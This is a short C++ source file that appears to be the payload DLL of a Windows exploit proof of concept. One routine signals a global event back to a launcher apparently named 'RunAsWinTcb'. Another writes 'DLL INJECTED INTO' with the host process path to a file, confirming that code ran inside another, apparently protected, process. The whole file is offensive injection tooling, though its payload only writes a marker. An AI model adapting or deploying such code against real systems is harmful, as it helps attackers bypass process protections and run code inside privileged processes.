#include "dllexploit.h"
#include <stdio.h>
#include <fstream>
using namespace std;

void ExploitMain() {
    LPWSTR g_pwszGuid = NULL;

    WCHAR wszEventName[MAX_PATH] = { 0 };
    HANDLE hEvent = NULL;


    LPWSTR pwszCommandLine = GetCommandLine();
    LPWSTR* argv = NULL;
    int argc = 0;

    argv = CommandLineToArgvW(pwszCommandLine, &argc);
    g_pwszGuid = argv[1];

    //Signaling RunAsWinTcb back
    StringCchPrintf(wszEventName, MAX_PATH, L"Global\\%ws_DLL_LOADED", g_pwszGuid);
    if (hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, wszEventName))
    {
        SetEvent(hEvent);
        CloseHandle(hEvent);
    }
}

void WriteSelfName(LPCWSTR filename) {
    ofstream myfile;
    myfile.open(filename);
    char result_text[128];
    wchar_t fullPath[MAX_PATH]{ 0 };
    DWORD name = GetModuleFileName(NULL, fullPath, MAX_PATH);
    _bstr_t b(fullPath);
    const char* c = b;
    sprintf_s(result_text, "DLL INJECTED INTO %s", c);
    myfile << result_text;
    myfile.close();
}